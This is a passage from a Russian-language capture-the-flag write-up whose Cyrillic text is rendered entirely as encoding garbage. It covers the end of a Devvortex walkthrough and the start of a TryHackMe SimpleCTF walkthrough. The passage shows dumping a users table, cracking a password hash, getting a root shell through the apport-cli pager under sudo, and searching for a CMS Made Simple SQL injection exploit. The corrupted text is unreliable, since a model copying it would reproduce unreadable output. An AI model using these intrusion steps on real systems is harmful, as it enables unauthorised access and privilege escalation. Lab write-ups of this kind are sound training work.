–•–º–º–º...¬†`logan`–∑–≤—É—á–∏—Ç –∑–Ω–∞–∫–æ–º–æ... –ê—Ö –¥–∞, –ø–æ—Å–ª–µ –∞—Ç–∞–∫–∏ —Å —Ü–µ–ª—å—é –∫—Ä–∞–∂–∏ –¥–∞–Ω–Ω—ã—Ö.¬†–¢–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ –≤–æ–π—Ç–∏ –≤¬†**SSH**¬†–∫–∞–∫¬†`logan`.¬†–ü–æ–¥–æ–∂–¥–∏—Ç–µ, –ø–æ—Å–∫–æ–ª—å–∫—É¬†`logan`–æ–Ω —Ç–∞–∫–∂–µ —è–≤–ª—è–µ—Ç—Å—è –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –Ω–∞ –Ω–∞—à–µ–π –ø–∞–Ω–µ–ª–∏ Joomla, –µ–≥–æ –ø–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö MySQL, –∫–æ—Ç–æ—Ä—É—é –º—ã –ø–æ–ª—É—á–∏–ª–∏ —Ä–∞–Ω–µ–µ, –≤–µ—Ä–Ω–æ?¬†–î—É–º–∞—é, –µ—Å—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Å–ø–æ—Å–æ–± —ç—Ç–æ –≤—ã—è—Å–Ω–∏—Ç—å.¬†–ü–æ–¥–∫–ª—é—á–∏–º—Å—è –∫ –ë–î –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –ø–æ–ª—É—á–∏–º.

–ü—Ä–µ–∂–¥–µ —á–µ–º –ø—Ä–∏—Å—Ç—É–ø–∏—Ç—å¬†`mysql`–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—é –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö, –¥–∞–≤–∞–π—Ç–µ —Å–æ–∑–¥–∞–¥–∏–º —É—Ç–∏–ª–∏—Ç—ã –ø—Å–µ–≤–¥–æ—Ç–µ—Ä–º–∏–Ω–∞–ª–∞ —Å –ø–æ–º–æ—â—å—é Python (–ø–æ—Å–∫–æ–ª—å–∫—É¬†`mysql`—Ç—Ä–µ–±—É–µ—Ç—Å—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å, —ç—Ç–æ –Ω–∞–º –≤–æ –≤—Å–µ–º –ø–æ–º–æ–∂–µ—Ç)

–î–ª—è —É–¥–æ–±—Å—Ç–≤–∞:

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![[Pasted image 20240224002141.png]]

–ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—è —Ç–∞–±–ª–∏—Ü—ã, –º—ã –≤—Å—Ç—Ä–µ—á–∞–µ–º¬†`sd4fg_users`table.¬†–î–∞–≤–∞–π—Ç–µ –≤—ã–±–µ—Ä–µ–º –∏–∑ –Ω–µ–≥–æ –≤—Å–µ –∑–∞–ø–∏—Å–∏ –∏ —Å–±—Ä–æ—Å–∏–º –∏—Ö.

![[Pasted image 20240224002230.png]]

–ó–¥–µ—Å—å –º—ã –≤–∏–¥–∏–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:¬†`lewis`–∏¬†`logan`.¬†–û—Ç–ª–∏—á–Ω–æ, –¥–∞–≤–∞–π—Ç–µ —Å–æ—Ö—Ä–∞–Ω–∏–º¬†`logan`—Ö–µ—à –Ω–∞ —Ö–æ—Å—Ç-–º–∞—à–∏–Ω–µ –∏ –ø–æ–ø—Ä–æ–±—É–µ–º –≤–∑–ª–æ–º–∞—Ç—å –µ–≥–æ —Å –ø–æ–º–æ—â—å—é —É—Ç–∏–ª–∏—Ç—ã¬†[John](https://www.kali.org/tools/john/)¬†.

![[Pasted image 20240224002319.png]]

–í–æ—Ç –∏ –≤—Å–µ, –ø–∞—Ä–æ–ª—å –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É –Ω–∞—Å –µ—Å—Ç—å¬†`logan`.¬†–î–∞–≤–∞–π—Ç–µ –ø—Ä–æ–π–¥—ë–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é —á–µ—Ä–µ–∑¬†**SSH**¬†–∏ –∑–∞—Ñ–∏–∫—Å–∏—Ä—É–µ–º —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

![[Pasted image 20240224002343.png]]

## –≠—Å–∫–∞–ª–∞—Ü–∏—è –¥–æ root:

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∞ —É—Ä–æ–≤–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫ —Å–µ—Ä–≤–µ—Ä—É, –Ω–∞–º –Ω—É–∂–Ω–æ –∫–∞–∫–∏–º-—Ç–æ –æ–±—Ä–∞–∑–æ–º –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –¥–æ root –∏ –ø–æ–ª—É—á–∏—Ç—å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π —Ñ–ª–∞–≥.

–ü—Ä–µ–∂–¥–µ —á–µ–º –∑–∞–≥—Ä—É–∂–∞—Ç—å –∫–∞–∫–∏–µ-–ª–∏–±–æ —Å—Ü–µ–Ω–∞—Ä–∏–∏ LinPEAS –∏–ª–∏ –ø–æ–¥–æ–±–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏, —è –Ω–∞—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ—Å—Ç—É—é¬†`sudo -l`–∫–æ–º–∞–Ω–¥—É.¬†–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –∑–Ω–∞–µ–º –ø–∞—Ä–æ–ª—å, –º—ã —Å–º–æ–∂–µ–º –ø—Ä–æ–π—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –º–æ–∂–µ–º –ª–∏ –º—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–∞–∫–æ–π-–ª–∏–±–æ —Å–∫—Ä–∏–ø—Ç —Å root-–¥–æ—Å—Ç—É–ø–æ–º.

![[Pasted image 20240224002627.png]]

–ù—É-–Ω—É.. –ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ.¬†–ü–æ—Ö–æ–∂–µ –Ω–∞¬†`apport-cli`–ø–æ–ª–µ–∑–Ω–æ—Å—Ç—å.¬†–î–∞–≤–∞–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏–º –µ–≥–æ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —Å —á–µ–º –º—ã —Å—Ç–æ–ª–∫–Ω–µ–º—Å—è.

![[Pasted image 20240224002640.png]]

–í—ã–≥–ª—è–¥–∏—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ.¬†–ú–æ–∂–µ—Ç –±—ã—Ç—å, –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–µ—Ä—Å–∏—é..?

**2.20.11**¬†‚Äî –Ω–∞–ø–æ–º–Ω–∏–ª –º–Ω–µ –æ–± —É—è–∑–≤–∏–º–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä–∞—è –∑–∞—Ç—Ä–∞–≥–∏–≤–∞–µ—Ç¬†**–≤–µ—Ä—Å–∏—é 2.26.0**¬†–∏ –±–æ–ª–µ–µ —Ä–∞–Ω–Ω–∏–µ.¬†–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–º–∏—Ç–∞ –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞¬†[–∏—Ö Github](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)¬†.¬†–í —Å–æ–æ–±—â–µ–Ω–∏–∏ –æ –∫–æ–º–º–∏—Ç–µ —è—Å–Ω–æ –≥–æ–≤–æ—Ä–∏—Ç—Å—è, —á—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ –µ–≥–æ¬†**–ø–µ–π–¥–∂–µ—Ä–µ**¬†, –∫–æ—Ç–æ—Ä—ã–π –¥–µ–π—Å—Ç–≤—É–µ—Ç –∫–∞–∫¬†[less](https://man7.org/linux/man-pages/man1/less.1.html)¬†–∏ –ø–æ–º–æ–≥–∞–µ—Ç –Ω–∞–º –≤—ã–π—Ç–∏ –∏–∑ –ø–æ–¥—Å–∫–∞–∑–∫–∏ –≤–≤–æ–¥–∞.¬†–¢–∏–ø–∏—á–Ω—ã–π¬†[GTFOBin](https://gtfobins.github.io/gtfobins/less/)¬†.¬†–ß—Ç–æ–±—ã –¥–æ–±—Ä–∞—Ç—å—Å—è –¥–æ¬†**–ø–µ–π–¥–∂–µ—Ä–∞**¬†, –Ω–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç ¬´–∑–∞–≥—Ä—É–∑–∏—Ç—å –∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å¬ª –æ—Ç—á–µ—Ç –æ —Å–±–æ–µ —Å –ø–æ–º–æ—â—å—é —ç—Ç–æ–≥–æ¬†`apport-cli`–∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞.¬†–û–±—ã—á–Ω–æ Linux —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –æ—Ç—á–µ—Ç—ã –æ —Å–±–æ—è—Ö –≤¬†`/var/crash`–∫–∞—Ç–∞–ª–æ–≥–µ.¬†–ù–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–∏—è —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏¬†–ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç¬†**_usr_bin_apport-cli.0.crash (–Ω–µ –∏–º–µ–µ—Ç –æ—Å–æ–±–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è, –∫–∞–∫–æ–π —Ñ–∞–π–ª —Å–±–æ—è –º—ã –∑–∞–≥—Ä—É–∂–∞–µ–º. –ù–∞–º –ø—Ä–æ—Å—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±—Ä–∞—Ç—å—Å—è –¥–æ**¬†**–ø–µ–π–¥–∂–µ—Ä–∞**¬†)

```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash
```

–ü–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –ø—Ä–∏ –ø–æ—è–≤–ª–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞ –≤–≤–µ–¥–∏—Ç–µ¬†`V`–∏ –ø–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥.¬†–ü–æ–∑–≤–æ–ª—å—Ç–µ¬†`apport-cli`–∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Å—é —Å–≤–æ—é –º–∞–≥–∏—é.

–ö–∞–∫ —Ç–æ–ª—å–∫–æ –≤—ã¬†`:`–Ω–∞–∂–º–µ—Ç–µ —Å–∏–º–≤–æ–ª, –ø–µ–π–¥–∂–µ—Ä –ø–æ—è–≤–∏—Ç—Å—è!

–î–∞–≤–∞–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏–º¬†`!/bin/bash`–æ–±–æ–ª–æ—á–∫—É –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root (–ø–æ–º–Ω–∏—Ç–µ, –º—ã –∑–∞–ø—É—Å—Ç–∏–ª–∏¬†`apport-cli`–∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª —Å –ø–æ–º–æ—â—å—é¬†`sudo`)

```bash
cat /root/root.txt
```


–î–∞–º—ã –∏ –≥–æ—Å–ø–æ–¥–∞, —É –Ω–∞—Å –µ—Å—Ç—å¬†—É—Å–ø–µ—à–Ω–æ –≤–Ω–µ–¥—Ä–µ–Ω–Ω–∞—è –º–∞—à–∏–Ω–∞¬†**Devvortex .**

**–£–¥–∞—á–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–µ—Ä–∞!**

---

# SimpleCTF

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

–ü—Ä–æ—Å—Ç–æ–π CTF ‚Äî —ç—Ç–æ CTF –¥–ª—è –Ω–∞—á–∏–Ω–∞—é—â–∏—Ö –Ω–∞ TryHackMe, –∫–æ—Ç–æ—Ä—ã–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –Ω–∞–≤—ã–∫–æ–≤, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–ª—è –≤—Å–µ—Ö CTF, –≤–∫–ª—é—á–∞—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ, –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ, —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é –∏ –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.
## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

```
nmap -SC -ST <TARGET>
```

![[Pasted image 20230711151106.png]]

–ù–∞–º —É–¥–∞–ª–æ—Å—å –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —Ç—Ä–∏ —Å–ª—É–∂–±—ã, —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ. FTP –∏–ª–∏ —Å–ª—É–∂–±–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ –ø–µ—Ä–µ–¥–∞—á–∏ —Ñ–∞–π–ª–æ–≤, —Ä–∞–±–æ—Ç–∞—é—â–∞—è –Ω–∞ –ø–æ—Ä—Ç—É 21, 80 —Å–æ —Å–ª—É–∂–±–æ–π HTTP. –ò –ø–æ—Å–ª–µ–¥–Ω–µ–µ, –Ω–æ –Ω–µ –º–µ–Ω–µ–µ –≤–∞–∂–Ω–æ–µ. 2222 –ø–æ—Ä—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–ª—É–∂–±–∞. Ethernet IP-1.
## –ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–∞ 21/FTP-—Å–µ—Ä–≤–∏—Å–∞

–ò–∑ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã—Ö –≤—ã—à–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ ¬´–ê–Ω–æ–Ω–∏–º–Ω—ã–π FTP-–≤—Ö–æ–¥ —Ä–∞–∑—Ä–µ—à–µ–Ω¬ª, –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –≤–æ–π–¥–µ–º.

![[Pasted image 20230711152049.png]]

–í—ã–ø–æ–ª–Ω—è—è –ø–æ–∏—Å–∫ –Ω–∞ FTP-—Å–µ—Ä–≤–µ—Ä–µ, –º—ã –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ _–∫–∞—Ç–∞–ª–æ–≥ pub_.

![[Pasted image 20230711153608.png]]

–í–Ω—É—Ç—Ä–∏ _–∫–∞—Ç–∞–ª–æ–≥–∞ pub_ —É –Ω–∞—Å –µ—Å—Ç—å —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º ¬´ForMitch.txt¬ª. –î–∞–≤–∞–π—Ç–µ —Å–∫–∞—á–∞–µ–º –µ–≥–æ, —á—Ç–æ–±—ã –º—ã –º–æ–≥–ª–∏ –µ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å, –æ–Ω –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é!

![[Pasted image 20230711153620.png]]

![[Pasted image 20230711153627.png]]

–•–º, –Ω–∏—á–µ–≥–æ –æ—Å–æ–±–µ–Ω–Ω–æ–≥–æ, –Ω–æ –º—ã –∑–Ω–∞–µ–º, —á—Ç–æ —É ¬´mitch¬ª –µ—Å—Ç—å –≤–∑–ª–∞–º—ã–≤–∞–µ–º—ã–π –ø–∞—Ä–æ–ª—å.

–ò–∑ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è nmap –º—ã –≤–∏–¥–∏–º, —á—Ç–æ —Ü–µ–ª–µ–≤–∞—è –º–∞—à–∏–Ω–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –∞–Ω–æ–Ω–∏–º–Ω–æ. FTP-–¥–æ—Å—Ç—É–ø –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –û–¥–Ω–∞–∫–æ, –∫–æ–≥–¥–∞ –º—ã –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–ª—É–∂–±–µ FTP, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏, —á—Ç–æ –±—ã–ª–∞ –∑–∞–º–µ—Ç–∫–∞, –¥–æ—Å—Ç—É–ø–Ω–∞—è –∫–∞–∫ –∞–Ω–æ–Ω–∏–º–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∏ —ç—Ç–æ –±—ã–ª–∞ –∫—Ä–æ–ª–∏—á—å—è –Ω–æ—Ä–∞, –≤ –∫–æ—Ç–æ—Ä—É—é –º—ã –º–æ–≥–ª–∏ –±—ã —Å–ø—É—Å—Ç–∏—Ç—å—Å—è.

–ü—Ä–æ–¥–æ–ª–∂–∏–º –Ω–∞ –ø–æ—Ä—Ç—É 80. –ú—ã –ø—ã—Ç–∞–µ–º—Å—è –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å IP-–∞–¥—Ä–µ—Å –≤ –±—Ä–∞—É–∑–µ—Ä–µ. , —Ç–∞–∫ –∫–∞–∫ —Å–ª—É–∂–±–∞ HTTP —Ä–∞–±–æ—Ç–∞–ª–∞ –Ω–∞ –º–∞—à–∏–Ω–µ, –∏ –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏, —á—Ç–æ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è —Ä–∞–±–æ—á–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ HTTP –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –≤ Ubuntu. –ü—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –ø–æ—Ä—Ç—É 80 —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä Firefox —É –Ω–∞—Å –µ—Å—Ç—å ¬´—Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é Apache2 Ubuntu¬ª.

![[Pasted image 20230711154119.png]]

–ù–∏—á–µ–≥–æ –æ—Å–æ–±–µ–Ω–Ω–æ–≥–æ. –ü–æ—Å–∫–æ–ª—å–∫—É —É –Ω–∞—Å –Ω–µ—Ç –Ω–∏–∫–∞–∫–æ–π –¥—Ä—É–≥–æ–π –ø–æ–¥—Å–∫–∞–∑–∫–∏ —á—Ç–æ–±—ã –¥–≤–∏–≥–∞—Ç—å—Å—è –¥–∞–ª—å—à–µ, –∫–æ–≥–¥–∞ –º—ã —Ä–µ—à–∏–ª–∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∞—Ç–∞–∫—É –≥—Ä—É–±–æ–π —Å–∏–ª—ã –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ dirb.


## –ü–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–æ–ª–æ–≥–æ–≤

```bash
dirb <target>
```

–ú–æ–∂–Ω–æ —Å–∏–ø–æ–ª—å–∑–æ–≤–∞—Ç—å gobuster, padbuster –∏–ª–∏ –¥—Ä—É–≥–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –Ω–∞ –≤–∞—à –≤–∫—É—Å.

![[Pasted image 20230711154303.png]]

![[Pasted image 20230711154325.png]]

–ü—É—Ç–µ–º –ø–µ—Ä–µ–±–æ—Ä–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –º—ã —Å–º–æ–≥–ª–∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É robot.txt –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ, –∞ —Ç–∞–∫–∂–µ –∫–∞—Ç–∞–ª–æ–≥ simple. –ú—ã –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –ø—Ä–æ—Å—Ç–æ–π –∫–∞—Ç–∞–ª–æ–≥ —Å –ø–æ–º–æ—â—å—é –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä–∞ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏, —á—Ç–æ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ ‚Äã‚ÄãCMS, —Å–¥–µ–ª–∞–Ω–Ω–∞—è –ø—Ä–æ—Å—Ç–æ–π CMS.

![[Pasted image 20230711154547.png]]

–ú—ã –≤–∏–¥–∏–º, —á—Ç–æ —Ñ–∞–π–ª _robots.txt_ –∑–∞–ø—Ä–µ—â–∞–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ User-agent –≤ _–∫–∞—Ç–∞–ª–æ–≥–µ /openemr-5_0_1_3_ (–ø–æ–¥—Ä–æ–±–Ω–µ–µ –æ robots.txt –º–æ–∂–Ω–æ —É–∑–Ω–∞—Ç—å [–∑–¥–µ—Å—å](https://developers.google.com/search/docs/advanced/robots/create-robots-txt) ). –≠—Ç–æ—Ç –∫–∞—Ç–∞–ª–æ–≥ –≤–æ–æ–±—â–µ –≤—ã—Ö–æ–¥–∏—Ç?

![[Pasted image 20230711154609.png]]

–ö–∞–∂–µ—Ç—Å—è, –Ω–µ—Ç, —ç—Ç–æ –∫—Ä–æ–ª–µ—á–∞—è –Ω–æ—Ä–∞. –ß—Ç–æ–±—ã —Ç–µ–ø–µ—Ä—å –Ω–µ –ø–æ–≥—Ä—É–∑–∏—Ç—å—Å—è –≤ _–ø—Ä–æ—Å—Ç–æ–π_ –∫–∞—Ç–∞–ª–æ–≥, –∏ –µ—Å–ª–∏ –º—ã –Ω–µ –Ω–∞–π–¥–µ–º –Ω–∏—á–µ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–≥–æ, –º—ã –º–æ–∂–µ–º –≤–µ—Ä–Ω—É—Ç—å—Å—è –∫ robots.txt –∏ –ø–æ–¥—Ä–æ–±–Ω–µ–µ –∏–∑—É—á–∏—Ç—å ¬´openemr¬ª.

–î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É simple —Å–µ–π—á–∞—Å –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –º—ã –Ω–∞–π–¥–µ–º.

![[Pasted image 20230711154823.png]]

–ó–¥–µ—Å—å –º—ã –≤–∏–¥–∏–º, —á—Ç–æ —ç—Ç–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –¥–ª—è —á–µ–≥–æ-—Ç–æ –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º ¬´CMS Made Simple¬ª, –∏ –µ—Å–ª–∏ –º—ã –ø–æ—Å–º–æ—Ç—Ä–∏–º –≤ –Ω–∏–∂–Ω–∏–π —É–≥–æ–ª, —Ç–æ —É–≤–∏–¥–∏–º, —á—Ç–æ —ç—Ç–æ –≤–µ—Ä—Å–∏—è 2.2.8.

–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –≤—ã—à–µ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –µ—Å—Ç—å —Å—Å—ã–ª–∫–∞ ¬´–ï—Å–ª–∏ —ç—Ç–æ –≤–∞—à —Å–∞–π—Ç, –Ω–∞–∂–º–∏—Ç–µ –∑–¥–µ—Å—å, —á—Ç–æ–±—ã –≤–æ–π—Ç–∏¬ª, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç –Ω–∞–ø—Ä–∞–≤–∏—Ç—å –Ω–∞—Å –Ω–∞ –ø–æ—Ä—Ç–∞–ª –≤—Ö–æ–¥–∞. –ò–ù–¢–ï–†–ï–° –ì. –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –Ω–µ–µ.

![[Pasted image 20230711155124.png]]

–î–∞, –º—ã –±—ã–ª–∏ –ø—Ä–∞–≤—ã. –ú—ã –Ω–∞—à–ª–∏ –ø–æ—Ä—Ç–∞–ª –≤—Ö–æ–¥–∞. –ó–∞–º–µ—á–∞—Ç–µ–ª—å–Ω–æ! –¢–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ –∏—Å–∫–∞—Ç—å –≤–æ–∑–º–æ–∂–Ω—ã–π —ç–∫—Å–ø–ª–æ–π—Ç –Ω–∞ CMS Made Simple. –ò–∑ –∫–∞—Ç–∞–ª–æ–≥–∞ / _simple_ –º—ã —Ç–∞–∫–∂–µ –º–æ–∂–µ–º —É–≤–∏–¥–µ—Ç—å –≤–µ—Ä—Å–∏—é.

![[Pasted image 20230711155146.png]]

## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–í–æ–∑–≤—Ä–∞—â–∞—è—Å—å –∫ —É–ø—Ä–æ—â–µ–Ω–Ω–æ–π CMS, –º—ã –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å –Ω–∞–π—Ç–∏ –ª—é–±–æ–π –≤–æ–∑–º–æ–∂–Ω—ã–π —ç–∫—Å–ø–ª–æ–π—Ç —Å –ø–æ–º–æ—â—å—é searchsploit. Searchsploit —Å–º–æ–≥ –Ω–∞–π—Ç–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å SQL-–∏–Ω—ä–µ–∫—Ü–∏–π, —Ä–∞–±–æ—Ç–∞—é—â—É—é –Ω–∞ CMS Made simple. –ú—ã —Å–∫–∞—á–∞–ª–∏ —ç–∫—Å–ø–ª–æ–π—Ç, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ.


```bash
searchsploit cms made simple
searchsploit -m 46635
```

![[Pasted image 20230711155334.png]]

–¢–∞–∫–∂–µ –º—ã –º–æ–∂–µ–º –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è Google! –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –µ—Å—Ç—å –ª–∏ —á—Ç–æ-–Ω–∏–±—É–¥—å –≤ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –æ–± —ç—Ç–æ–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –≤–µ—Ä—Å–∏–∏, –ø—Ä–æ—Å—Ç–æ –∑–∞–π–¥—è –≤ Google –∏ –≤—ã–ø–æ–ª–Ω–∏–≤ –ø–æ–∏—Å–∫ ¬´CMS Made Simple 2.2.8 —ç–∫—Å–ø–ª–æ–π—Ç¬ª.

![[Pasted image 20230711155430.png]]

